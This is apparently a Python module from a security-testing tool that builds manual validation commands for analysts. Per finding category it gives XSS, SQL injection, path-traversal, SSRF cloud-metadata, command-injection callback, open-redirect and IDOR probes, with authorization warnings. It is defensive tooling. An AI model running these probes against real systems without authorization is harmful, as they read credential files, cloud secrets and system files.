"""
Validation Assistance Service
==============================
Produces suggested manual testing commands for analyst-assisted validation.
Does NOT execute any commands automatically.

All outputs are informational, for the analyst to run in their own environment.
"""
from dataclasses import dataclass
from typing import Optional

from app.models.models import FindingCategory, FindingSeverity
from app.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class ValidationSuggestion:
    """A single suggested validation step for analyst review."""
    finding_id: str
    title: str
    severity: str
    category: str
    url: str
    commands: list[str]
    notes: str
    risk_note: str = ""


# ─── Command Templates ────────────────────────────────────────────────────────

def _xss_commands(url: str, parameter: Optional[str]) -> list[str]:
    param_hint = f"?{parameter}=PAYLOAD" if parameter else "?q=PAYLOAD"
    return [
        f"# Automated XSS scan (run in your environment):",
        f"dalfox url \"{url}\" --follow-redirects --silence",
        f"",
        f"# Manual test with basic payload:",
        f"curl -s \"{url}{param_hint}\" | grep -i '<script'",
        f"",
        f"# Test reflected XSS:",
        f"curl -s \"{url}{param_hint.replace('PAYLOAD', '<img+src=x+onerror=alert(1)>')}\"",
    ]


def _sqli_commands(url: str, parameter: Optional[str]) -> list[str]:
    param_hint = f"-p {parameter}" if parameter else ""
    manual_test_query = f"?{parameter}='" if parameter else "?id=1"
    time_test_query = f"?{parameter}=1 AND SLEEP(5)" if parameter else "?id=1 AND SLEEP(5)"
    return [
        f"# Safe sqlmap run (risk=1, level=1, no dump):",
        f"sqlmap -u \"{url}\" {param_hint} --batch --risk=1 --level=1 --technique=BT",
        f"",
        f"# Manual error-based test:",
        f"curl -s \"{url}{manual_test_query}\" | grep -iE 'sql|error|syntax'",
        f"",
        f"# Time-based blind test:",
        f"curl -s -o /dev/null -w '%{{time_total}}' \"{url}{time_test_query}\"",
    ]


def _lfi_commands(url: str, parameter: Optional[str]) -> list[str]:
    param = parameter or "file"
    return [
        f"# Test common LFI paths:",
        f"curl -s \"{url}?{param}=../../../../etc/passwd\" | head -20",
        f"curl -s \"{url}?{param}=....//....//etc/hosts\"",
        f"curl -s \"{url}?{param}=/proc/self/environ\"",
        f"",
        f"# Test app configuration files:",
        f"curl -s \"{url}?{param}=../../../../.env\"",
        f"curl -s \"{url}?{param}=../../../../config/database.yml\"",
    ]


def _ssrf_commands(url: str, parameter: Optional[str]) -> list[str]:
    param = parameter or "url"
    return [
        f"# Setup: Get an interactsh host first: https://github.com/projectdiscovery/interactsh",
        f"# Replace YOUR_INTERACTSH_HOST with your instance",
        f"",
        f"# Out-of-band test:",
        f"curl -s \"{url}?{param}=http://YOUR_INTERACTSH_HOST\"",
        f"",
        f"# Cloud metadata tests (only if cloud-hosted):",
        f"curl -s \"{url}?{param}=http://169.254.169.254/latest/meta-data/\"  # AWS",
        f"curl -s \"{url}?{param}=http://metadata.google.internal/computeMetadata/v1/\" -H 'Metadata-Flavor: Google'  # GCP",
        f"curl -s \"{url}?{param}=http://169.254.169.254/metadata?api-version=2021-02-01\" -H 'Metadata: true'  # Azure",
    ]


def _rce_commands(url: str, parameter: Optional[str]) -> list[str]:
    param = parameter or "cmd"
    return [
        f"# WARNING: Only run in authorized scope. Start with safe commands.",
        f"",
        f"# Safe test command (id / whoami):",
        f"curl -s \"{url}?{param}=id\"",
        f"curl -s \"{url}\" --data \"{param}=id\"",
        f"",
        f"# Out-of-band verification:",
        f"curl -s \"{url}?{param}=curl+http://YOUR_INTERACTSH_HOST\"",
        f"",
        f"# Time-based blind RCE:",
        f"curl -s -o /dev/null -w '%{{time_total}}' \"{url}?{param}=sleep+5\"",
    ]


def _sensitive_data_commands(url: str) -> list[str]:
    return [
        f"# Check response headers and body:",
        f"curl -I \"{url}\"",
        f"curl -s \"{url}\" | head -100",
        f"",
        f"# Check for exposed config/secrets:",
        f"curl -s \"{url}/.env\" | head -20",
        f"curl -s \"{url}/config.json\" | head -20",
        f"curl -s \"{url}/.git/config\"",
        f"",
        f"# Check for directory listing:",
        f"curl -s \"{url}/\" | grep -i '<a href'",
    ]


def _misconfiguration_commands(url: str) -> list[str]:
    return [
        f"# Security headers audit:",
        f"curl -I \"{url}\" | grep -iE 'strict-transport|content-security-policy|x-frame|x-content-type|permissions-policy'",
        f"",
        f"# CORS misconfiguration test:",
        f"curl -I -H 'Origin: https://evil.com' \"{url}\" | grep -i 'access-control'",
        f"",
        f"# TLS / HTTPS check:",
        f"curl -vv --max-time 10 \"{url}\" 2>&1 | grep -iE 'ssl|tls|cert'",
    ]


def _idor_commands(url: str, parameter: Optional[str]) -> list[str]:
    return [
        f"# IDOR testing requires two accounts. Steps:",
        f"# 1. Get a valid resource ID from Account A",
        f"# 2. Replay request with Account B's session token",
        f"",
        f"curl -s \"{url}\" \\",
        f"     -H \"Authorization: Bearer ACCOUNT_B_TOKEN\" \\",
        f"     -H \"Cookie: session=ACCOUNT_B_SESSION\"",
        f"",
        f"# Enumerate IDs incrementally:",
        f"for i in $(seq 1 10); do curl -s -o /dev/null -w \"%{{http_code}} $i\\n\" \"{url}?id=$i\" -H 'Authorization: Bearer YOUR_TOKEN'; done",
    ]


def _open_redirect_commands(url: str, parameter: Optional[str]) -> list[str]:
    param = parameter or "next"
    return [
        f"# Test open redirect:",
        f"curl -I \"{url}?{param}=https://evil.com\" | grep -i location",
        f"curl -I \"{url}?{param}=//evil.com\" | grep -i location",
        f"curl -I \"{url}?{param}=%2F%2Fevil.com\" | grep -i location",
        f"",
        f"# Test with subdomain confusion:",
        f"curl -I \"{url}?{param}=https://target.com.evil.com\" | grep -i location",
    ]


# ─── Command Dispatch ─────────────────────────────────────────────────────────

_COMMAND_BUILDERS = {
    FindingCategory.XSS: lambda url, param: _xss_commands(url, param),
    FindingCategory.SQLI: lambda url, param: _sqli_commands(url, param),
    FindingCategory.LFI: lambda url, param: _lfi_commands(url, param),
    FindingCategory.SSRF: lambda url, param: _ssrf_commands(url, param),
    FindingCategory.RCE: lambda url, param: _rce_commands(url, param),
    FindingCategory.SENSITIVE_DATA: lambda url, param: _sensitive_data_commands(url),
    FindingCategory.MISCONFIGURATION: lambda url, param: _misconfiguration_commands(url),
    FindingCategory.IDOR: lambda url, param: _idor_commands(url, param),
    FindingCategory.OPEN_REDIRECT: lambda url, param: _open_redirect_commands(url, param),
}

_RISK_NOTES = {
    FindingCategory.RCE: "⚠️  RCE testing must be performed carefully. Start with safe, observable commands only.",
    FindingCategory.SQLI: "⚠️  Use safe sqlmap options. Do NOT dump data without explicit client authorization.",
    FindingCategory.SSRF: "⚠️  Only test metadata endpoints if confirmed cloud-hosted. Avoid internal network probing beyond scope.",
}


def generate_validation_suggestions(
    finding_id: str,
    title: str,
    severity: FindingSeverity,
    category: FindingCategory,
    url: str,
    parameter: Optional[str] = None,
) -> ValidationSuggestion:
    """
    Generate analyst-facing validation commands for a single finding.
    These commands are for manual execution only — they are NOT auto-executed.

    Args:
        finding_id: Finding UUID for reference.
        title: Finding title.
        severity: Finding severity.
        category: Finding category.
        url: Affected URL.
        parameter: Affected URL parameter, if known.

    Returns:
        ValidationSuggestion with commands for the analyst.
    """
    builder = _COMMAND_BUILDERS.get(
        category,
        lambda u, p: [f"curl -s \"{u}\"", "# Inspect response manually"]
    )
    commands = builder(url, parameter)
    risk_note = _RISK_NOTES.get(category, "")
    notes = (
        f"Suggested validation for {category.value.upper()} finding. "
        f"Severity: {severity.value}. "
        f"All commands are analyst-suggested and must be run manually in an authorized environment."
    )

    return ValidationSuggestion(
        finding_id=finding_id,
        title=title,
        severity=severity.value,
        category=category.value,
        url=url,
        commands=commands,
        notes=notes,
        risk_note=risk_note,
    )


def generate_bulk_validation_report(suggestions: list[ValidationSuggestion]) -> str:
    """
    Render a Markdown-formatted validation guide from a list of suggestions.
    Intended for inclusion in reports.
    """
    lines = [
        "# Analyst Validation Guide",
        "",
        "> All commands below are **suggestions only**. Run them manually in an authorized environment.",
        "> Do NOT automate these without explicit authorization.",
        "",
    ]

    for s in suggestions:
        lines += [
            f"## [{s.severity.upper()}] {s.title}",
            f"**Category:** `{s.category}` | **URL:** `{s.url}`",
            "",
        ]
        if s.risk_note:
            lines += [s.risk_note, ""]
        lines += ["```bash"] + s.commands + ["```", ""]

    return "\n".join(lines)
